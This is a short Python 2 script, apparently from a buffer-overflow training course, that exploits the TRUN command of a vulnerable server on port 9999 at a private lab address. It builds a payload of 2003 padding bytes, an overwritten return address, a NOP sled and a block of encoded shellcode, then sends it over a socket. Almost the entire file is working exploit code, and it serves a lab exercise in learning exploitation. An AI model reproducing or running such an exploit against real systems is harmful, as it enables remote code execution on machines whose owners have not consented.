#!/usr/bin/python
#Find the Offset Script Cyber Mentor
#7/23/2020


import sys, socket

over_flow = (
    "\xba\xa7\xd5\xc1\xcb\xda\xc4\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x0e\x03\xf7\xdb\x23\x3e\x0b\x0b\x21"
"\xc1\xf3\xcc\x46\x4b\x16\xfd\x46\x2f\x53\xae\x76\x3b\x31\x43"
"\xfc\x69\xa1\xd0\x70\xa6\xc6\x51\x3e\x90\xe9\x62\x13\xe0\x68"
"\xe1\x6e\x35\x4a\xd8\xa0\x48\x8b\x1d\xdc\xa1\xd9\xf6\xaa\x14"
"\xcd\x73\xe6\xa4\x66\xcf\xe6\xac\x9b\x98\x09\x9c\x0a\x92\x53"
"\x3e\xad\x77\xe8\x77\xb5\x94\xd5\xce\x4e\x6e\xa1\xd0\x86\xbe"
"\x4a\x7e\xe7\x0e\xb9\x7e\x20\xa8\x22\xf5\x58\xca\xdf\x0e\x9f"
"\xb0\x3b\x9a\x3b\x12\xcf\x3c\xe7\xa2\x1c\xda\x6c\xa8\xe9\xa8"
"\x2a\xad\xec\x7d\x41\xc9\x65\x80\x85\x5b\x3d\xa7\x01\x07\xe5"
"\xc6\x10\xed\x48\xf6\x42\x4e\x34\x52\x09\x63\x21\xef\x50\xec"
"\x86\xc2\x6a\xec\x80\x55\x19\xde\x0f\xce\xb5\x52\xc7\xc8\x42"
"\x94\xf2\xad\xdc\x6b\xfd\xcd\xf5\xaf\xa9\x9d\x6d\x19\xd2\x75"
"\x6d\xa6\x07\xd9\x3d\x08\xf8\x9a\xed\xe8\xa8\x72\xe7\xe6\x97"
"\x63\x08\x2d\xb0\x0e\xf3\xa6\x7f\x66\xf8\x2c\xe8\x75\xfe\x41"
"\xb4\xf0\x18\x0b\x54\x55\xb3\xa4\xcd\xfc\x4f\x54\x11\x2b\x2a"
"\x56\x99\xd8\xcb\x19\x6a\x94\xdf\xce\x9a\xe3\xbd\x59\xa4\xd9"
"\xa9\x06\x37\x86\x29\x40\x24\x11\x7e\x05\x9a\x68\xea\xbb\x85"
"\xc2\x08\x46\x53\x2c\x88\x9d\xa0\xb3\x11\x53\x9c\x97\x01\xad"
"\x1d\x9c\x75\x61\x48\x4a\x23\xc7\x22\x3c\x9d\x91\x99\x96\x49"
"\x67\xd2\x28\x0f\x68\x3f\xdf\xef\xd9\x96\xa6\x10\xd5\x7e\x2f"
"\x69\x0b\x1f\xd0\xa0\x8f\x3f\x33\x60\xfa\xd7\xea\xe1\x47\xba"
"\x0c\xdc\x84\xc3\x8e\xd4\x74\x30\x8e\x9d\x71\x7c\x08\x4e\x08"
"\xed\xfd\x70\xbf\x0e\xd4"
)

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + over_flow
# little endian format hex in reverse order
# "A" * 2003 gets to EIP
#  "\xaf\x11\x50\x62" EIP to Pointer address
# need to include nops(padding) in front of overflow "\x90" * 32

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.3.37',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()
